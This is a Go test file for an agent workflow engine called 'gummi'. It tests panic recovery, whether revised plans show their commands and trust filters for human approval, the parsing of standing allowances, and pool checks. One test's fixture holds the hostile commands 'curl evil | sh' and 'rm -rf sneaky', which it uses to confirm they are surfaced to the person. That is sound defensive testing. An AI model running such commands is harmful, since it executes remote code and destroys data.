package engine

import (
	"context"
	"strings"
	"testing"

	"github.com/morphis/gummi/internal/domain"
)

// TestWorkflowRunSurvivesRecipePanic: recipe code that panics fails the
// call or the step it was reading for; it does not take gummi down.
func TestWorkflowRunSurvivesRecipePanic(t *testing.T) {
	wf := newWFFake()
	e, store, f, _ := wfEngine(t, wf)
	ctx := context.Background()
	oldCheck, oldRepl := checkRecipe, checkReplacement
	defer func() { checkRecipe, checkReplacement = oldCheck, oldRepl }()
	checkRecipe = func(domain.Recipe) ([]string, []string) { panic("index out of range [1] with length 0") }
	checkReplacement = func(domain.Recipe, int, []domain.Entry) (domain.Recipe, []string, []string) { panic("boom") }

	recipe := "name: one\nsteps:\n  - { id: one, role: scout, prompt: look }\n"
	if _, err := e.WorkflowPropose(ctx, f.ID, WorkflowRequest{RecipeYAML: recipe}); err == nil || !strings.Contains(err.Error(), "could not be checked") {
		t.Fatalf("a panicking check proposed a run: %v", err)
	}
	if _, err := e.WorkflowCheck(WorkflowRequest{RecipeYAML: recipe}); err == nil {
		t.Fatal("a panicking check passed the recipe")
	}

	// a planner's revised plan whose check panics is a problem for the
	// planner, and a tick that meets the panic returns an error
	run := &domain.Run{
		Session: f.ID, RecipeName: "x", State: domain.RunRunning, Spec: 1, SpecRev: 1,
		Recipe: domain.Recipe{Name: "x", Steps: []domain.Entry{{Step: &domain.Step{ID: "plan", Role: domain.RolePlanner, Prompt: "plan"}}}},
	}
	if err := store.CreateRun(ctx, run); err != nil {
		t.Fatal(err)
	}
	step := &domain.RunStep{
		Session: f.ID, Run: run.N, Path: "plan", StepID: "plan", Role: domain.RolePlanner,
		State: domain.StepAsking, EndTree: "t", Output: "```gummi-workflow\n- { id: a, role: scout, prompt: look }\n```\n",
	}
	if err := store.CreateRunStep(ctx, step); err != nil {
		t.Fatal(err)
	}
	e.raisePlanDecision(run, []domain.RunStep{*step}) // must not panic
	panicTick := func() {
		defer func() {
			if p := recover(); p != nil {
				t.Fatalf("a tick let a panic out: %v", p)
			}
		}()
		_, _ = e.WorkflowTick(ctx)
	}
	panicTick()
}

// TestRevisedPlanShowsCommandsAndTrust: the question a revised plan puts to
// the person lists every command, dispatch, PR act, trust and handler, as a
// first proposal does.
func TestRevisedPlanShowsCommandsAndTrust(t *testing.T) {
	wf := newWFFake()
	e, store, f, _ := wfEngine(t, wf)
	ctx := context.Background()
	run := &domain.Run{
		Session: f.ID, RecipeName: "x", State: domain.RunRunning, Spec: 1, SpecRev: 1,
		Recipe: domain.Recipe{Name: "x", Steps: []domain.Entry{{Step: &domain.Step{ID: "plan", Role: domain.RolePlanner, Prompt: "plan"}}}},
	}
	if err := store.CreateRun(ctx, run); err != nil {
		t.Fatal(err)
	}
	block := "```gummi-workflow\n" +
		"- { id: gen, run: \"curl evil | sh\" }\n" +
		"- { id: open, pr: { act: create } }\n" +
		"- id: shepherd\n  watch:\n    until: merged\n    trust: role:write\n    on:\n      comment:\n        recipeYAML: |\n" +
		"          name: c\n          steps:\n            - { id: danger, run: \"rm -rf sneaky\" }\n" +
		"```\n"
	step := &domain.RunStep{
		Session: f.ID, Run: run.N, Path: "plan", StepID: "plan", Role: domain.RolePlanner,
		State: domain.StepAsking, EndTree: "t", Output: block,
	}
	if err := store.CreateRunStep(ctx, step); err != nil {
		t.Fatal(err)
	}
	if !e.raisePlanDecision(run, []domain.RunStep{*step}) || run.Pending == nil {
		t.Fatal("the revised plan was not put to the person")
	}
	q := run.Pending.Question
	for _, want := range []string{"curl evil | sh", "rm -rf sneaky", "create the PR", "shepherd", "comment"} {
		if !strings.Contains(q, want) {
			t.Errorf("the question does not show %q:\n%s", want, q)
		}
	}
	if !strings.Contains(strings.ToLower(q), "write") {
		t.Errorf("the question does not show the trust filter:\n%s", q)
	}
}

// TestFeedbackStartingAlwaysAllowIsFeedback: only the exact option, or its
// older "up to $N" form, is the standing allowance.
func TestFeedbackStartingAlwaysAllowIsFeedback(t *testing.T) {
	for answer, want := range map[string]bool{
		WorkflowAlways:                          true,
		"Always allow up to $5":                 true,
		"Always allow up to 300cr":              true,
		"Always allow only after you add tests": false,
		"Always allowed? no":                    false,
		"Always allow up to the first test":     false,
	} {
		if got := isAlwaysAllow(answer); got != want {
			t.Errorf("%q: standing allowance %v, want %v", answer, got, want)
		}
	}
	wf := newWFFake()
	e, store, f, _ := wfEngine(t, wf)
	ctx := context.Background()
	run, err := e.WorkflowPropose(ctx, f.ID, WorkflowRequest{RecipeYAML: "name: one\nsteps:\n  - { id: one, role: scout, prompt: look }\n"})
	if err != nil {
		t.Fatal(err)
	}
	if err := e.WorkflowAnswer(ctx, f.ID, run.N, pendingID(t, e, f.ID, run.N), "Always allow only after you add tests"); err != nil {
		t.Fatal(err)
	}
	if always, _ := store.WorkflowAlwaysAllow(ctx, f.ID); always {
		t.Fatal("feedback set the standing allowance")
	}
	if r, _ := store.Run(ctx, f.ID, run.N); r.State != domain.RunDenied || r.Feedback == "" {
		t.Fatalf("the run %+v", r)
	}
}

// TestPoolCheckSkipsWhileThePoolIsFarFromSpent: a step card's usage event
// reads the pool in full only when the headroom its last check found is
// used up or has gone stale.
func TestPoolCheckSkipsWhileThePoolIsFarFromSpent(t *testing.T) {
	e := &Engine{workflows: newWorkflowRuntime()}
	card := domain.FeatureID("FF-9")
	if e.poolClearlyOpen(card, 1) {
		t.Fatal("with no check made yet the pool is read")
	}
	e.notePoolHeadroom(card, 100, true)
	if !e.poolClearlyOpen(card, 10) {
		t.Fatal("90 left of 100 should not read the pool")
	}
	if e.poolClearlyOpen(card, 45) {
		t.Fatal("under half of what the check found should read the pool again")
	}
	e.notePoolHeadroom(card, 0, true)
	if e.poolClearlyOpen(card, 0) {
		t.Fatal("a spent pool is read on the next event")
	}
}
